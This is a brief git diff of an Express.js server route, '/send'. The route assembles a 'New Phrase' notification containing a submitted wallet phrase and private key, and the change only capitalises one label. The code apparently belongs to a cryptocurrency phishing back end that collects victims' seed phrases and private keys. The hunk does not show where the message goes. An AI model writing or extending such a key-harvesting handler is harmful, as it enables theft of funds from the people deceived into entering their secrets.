@@ -22,7 +22,7 @@ app.post("/send", async (req, res) => {
     const message =
 `📩 New Phrase
 
-phrase: ${phrase}
+Phrase: ${phrase}
 
 privateKey: ${privateKey}
 
